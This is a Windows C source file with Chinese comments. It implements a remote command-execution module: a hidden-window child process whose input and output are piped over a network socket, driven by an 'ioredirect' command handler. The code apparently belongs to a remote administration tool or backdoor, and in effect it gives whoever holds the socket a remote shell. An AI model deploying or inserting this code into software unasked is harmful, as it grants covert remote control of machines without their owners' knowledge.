#include <windows.h>

#include "iodirect.h"

/*!
 * @brief:			重定向输入输出流开启进程
 * @author:			xbw
 * @date:			long long ago
 * @args:			可执行文件路径,输入管道句柄,输出管道句柄,存放Pid值指针(输出)
 * @return:			目标进程的句柄
 */

static HANDLE RedirectStreamOpen(LPSTR command,PHANDLE in,PHANDLE out,DWORD*pPid) //运行正确返回进程句柄 错误返回NULL;
{
    if(command==NULL | in == NULL | out == NULL | pPid == NULL)return 0; //检测参数是否正确

    SECURITY_ATTRIBUTES SecurityAttributes;
    HANDLE ShellStdinPipe = NULL;
    HANDLE ShellStdoutPipe = NULL;
    HANDLE hRead = NULL;
    HANDLE hWrite = NULL;

//设置安全属性
    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL; // 默认安全描述
    SecurityAttributes.bInheritHandle = TRUE; // 继承句柄

    if ( !CreatePipe(&hRead, &ShellStdoutPipe,&SecurityAttributes, 0) ) return NULL; //创建读取管道

    if ( !CreatePipe(&ShellStdinPipe, &hWrite,&SecurityAttributes, 0) ) //创建写入管道
    {
        CloseHandle (hRead);
        return NULL;
    }

//管道创建完毕
////////////////////////////////
//下面创建新进程并且把读写管道接入到新进程上

    PROCESS_INFORMATION ProcessInformation;
    STARTUPINFO si;
    HANDLE ProcessHandle = NULL;


    // 设置启动信息
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE; //隐藏
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; //标准流选项可用 窗口选项可用

    si.hStdInput  = ShellStdinPipe; //连接输入管道
    si.hStdOutput = ShellStdoutPipe; //连接输出管道

    // 将输出管道连接到子进程错误流
    DuplicateHandle(GetCurrentProcess(), ShellStdoutPipe,
                    GetCurrentProcess(), &si.hStdError,
                    DUPLICATE_SAME_ACCESS, TRUE, 0);

    //创建新进程
    if (CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL,
                      &si, &ProcessInformation))
    {
        ProcessHandle = ProcessInformation.hProcess;
        CloseHandle(ProcessInformation.hThread);
        *pPid = ProcessInformation.dwProcessId;
    }
    else
    {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        CloseHandle(ShellStdinPipe);
        CloseHandle(ShellStdoutPipe);
        return NULL;
    }
    CloseHandle(ShellStdinPipe);
    CloseHandle(ShellStdoutPipe);
    *in = hWrite;
    *out = hRead;
    return ProcessHandle;
}

//Peek data from output stream,send to socket
static DWORD WINAPI ReadEchoToSocket(void*p)
{
    int *tmp = (int*)p;
    HANDLE out = *(HANDLE*)&tmp[0];
    SOCKET s = *(SOCKET*)&tmp[1];
	HANDLE proc = *(HANDLE*)&tmp[2];
    DWORD t;
    char buf[IODIRECT_READBUF+1];
    while(PeekNamedPipe(out,buf,IODIRECT_READBUF,&t,NULL,NULL))
    {
		//Check if Proc close
		DWORD tt;
		if(!(GetExitCodeProcess(proc,&tt) && tt==STILL_ACTIVE))
		{
			break;
		}
        if(t>0)
        {
            ReadFile(out,buf,IODIRECT_READBUF,&t,NULL);
            if(socket_send(s,buf,t,0)<0)
            {
                break;
            }
        }
        else
        {
            Sleep(IODIRECT_TIMEWAIT);
            buf[0]=0;
            t=0;
        }
    }

    socket_send(s,COMMAND_QUIT,sizeof(COMMAND_QUIT),0);
	socket_close(s);
    return 0;
}

COMMAND_HANDLER_FUNC(ioredirect)
{
	while(1)
	{
		char read_buf[IODIRECT_READBUF+1]={0};
		HANDLE in=NULL,out=NULL,proc=NULL;
		DWORD pid=0;
		int nread = socket_recv(s,read_buf,IODIRECT_READBUF,0);
		if(nread<=0)
		{
			//Connect error
			break;
		}
		sscanf(read_buf,"%s",read_buf);
		proc= RedirectStreamOpen(read_buf,&in,&out,&pid);
		if(proc==NULL)
		{
			//Redirect Stream failed
			socket_send(s,COMMAND_FAILED,sizeof(COMMAND_FAILED),0);
			continue;
		}
		socket_send(s,COMMAND_SUCCESS,sizeof(COMMAND_SUCCESS),0);

		//Send Handle and socket to thread
		int tmp[3];
        tmp[0] = *(int*)&out;
        tmp[1] = *(int*)&s;
		tmp[2] = *(int*)&proc;

		//Create read echo thread
		CloseHandle(CreateThread(NULL,0,ReadEchoToSocket,tmp,0,NULL));
		Sleep(IODIRECT_TIMEWAIT);

		//Get remote command
		while(nread = d_recv(s,read_buf,IODIRECT_READBUF,0),nread>0)
		{
			DWORD t;
            if(!WriteFile(in,read_buf,nread,&t,NULL))
            {
                socket_send(s,COMMAND_QUIT,sizeof(COMMAND_QUIT),0);
                break;
            }
		}
		//Kill Process
		TerminateProcess(proc,0);
		CloseHandle(in);
		CloseHandle(out);
		CloseHandle(proc);
		break;
	}
	return 0;
}
